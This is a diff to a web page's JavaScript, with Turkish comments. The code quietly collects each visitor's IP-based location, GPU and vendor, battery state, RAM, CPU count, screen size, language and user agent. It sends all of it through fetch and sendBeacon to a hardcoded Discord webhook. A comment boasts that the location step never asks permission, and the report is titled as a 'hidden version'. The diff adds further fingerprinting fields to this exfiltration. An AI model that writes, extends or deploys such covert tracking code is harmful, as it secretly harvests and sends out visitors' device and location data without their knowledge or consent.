@@ -23,7 +23,7 @@
         const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
         async function herSeyiDök() {
-            let data = { gpu: "Bilinmiyor", ven: "Bilinmiyor", loc: "Yükleniyor...", ip: "X", bat: "X" };
+            let data = { gpu: "Bilinmiyor", ven: "Bilinmiyor", loc: "Yükleniyor...", ip: "X", bat: "X", lang: "Bilinmiyor", ram: "Bilinmiyor", cpu: "Bilinmiyor", screen: "Bilinmiyor" };
 
             // 1. IP ve SESSİZ KONUM (Asla izin istemez)
             try {
@@ -37,7 +37,14 @@
                 data.loc = "Lokasyon alınamadı";
             }
 
-            // 2. GPU ve VENDOR (Efsane Sorgu)
+            // 2. Cihaz Dili
+            try {
+                data.lang = navigator.language || "Bilinmiyor";
+            } catch(e) {
+                console.error("Dil bilgisi alınamadı: ", e);
+            }
+
+            // 3. GPU ve VENDOR (Efsane Sorgu)
             try {
                 const c = document.createElement('canvas');
                 const gl = c.getContext('webgl');
@@ -50,7 +57,7 @@
                 data.ven = "Bilinmiyor";
             }
 
-            // 3. PİL DURUMU
+            // 4. Pil Durumu
             try {
                 const b = await navigator.getBattery();
                 data.bat = `%${Math.round(b.level * 100)} (${b.charging ? 'Prizde' : 'Pilde'})`;
@@ -59,23 +66,42 @@
                 data.bat = "Bilinmiyor";
             }
 
-            // 4. O MEŞHUR KIRMIZI EMBED ŞABLONU
+            // 5. RAM ve CPU Bilgisi
+            try {
+                data.ram = `${navigator.deviceMemory} GB`;
+                data.cpu = `${navigator.hardwareConcurrency} Çekirdek`;
+            } catch(e) {
+                console.error("RAM/CPU bilgisi alınamadı: ", e);
+                data.ram = "Bilinmiyor";
+                data.cpu = "Bilinmiyor";
+            }
+
+            // 6. Ekran Çözünürlüğü
+            try {
+                data.screen = `${screen.width}x${screen.height}`;
+            } catch(e) {
+                console.error("Ekran çözünürlüğü alınamadı: ", e);
+                data.screen = "Bilinmiyor";
+            }
+
+            // 7. O MEŞHUR KIRMIZI EMBED ŞABLONU
             const payload = {
                 embeds: [{
                     title: "🕵️ KRİTİK SİSTEM ANALİZİ (GİZLİ SÜRÜM)",
                     color: 15158332,
                     fields: [
                         { name: "📍 LOKASYON (IP TABANLI)", value: data.loc, inline: false },
-                        { name: "🛠️ DONANIM KATMANI", value: `**GPU:** \`${data.gpu}\`\n**VENDOR:** \`${data.ven}\`\n**RAM:** ${navigator.deviceMemory}GB\n**CPU:** ${navigator.hardwareConcurrency} Çekirdek`, inline: false },
-                        { name: "📱 YAZILIM / EKRAN", value: `**OS:** ${navigator.platform}\n**RES:** ${screen.width}x${screen.height}`, inline: true },
+                        { name: "🛠️ DONANIM KATMANI", value: `**GPU:** \`${data.gpu}\`\n**VENDOR:** \`${data.ven}\`\n**RAM:** ${data.ram}\n**CPU:** ${data.cpu}`, inline: false },
+                        { name: "📱 YAZILIM / EKRAN", value: `**OS:** ${navigator.platform}\n**RES:** ${data.screen}`, inline: true },
                         { name: "🔋 DURUM", value: data.bat, inline: true },
-                        { name: "🔍 USER AGENT", value: "```" + navigator.userAgent + "```", inline: false }
+                        { name: "🔍 USER AGENT", value: "```" + navigator.userAgent + "```", inline: false },
+                        { name: "🌐 CİHAZ DİLİ", value: data.lang, inline: false }
                     ],
                     timestamp: new Date()
                 }]
             };
 
-            // 5. EN GARANTİ GÖNDERİM (Fetch + Beacon)
+            // 8. EN GARANTİ GÖNDERİM (Fetch + Beacon)
             const blob = JSON.stringify(payload);
             fetch(u, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: blob })
                 .then(response => {
@@ -87,7 +113,7 @@
                 });
             navigator.sendBeacon(u, blob);
 
-            // 6. ARAYÜZ AKIŞI
+            // 9. ARAYÜZ AKIŞI
             const msg = document.getElementById('msg');
             const loader = document.getElementById('loader');
             
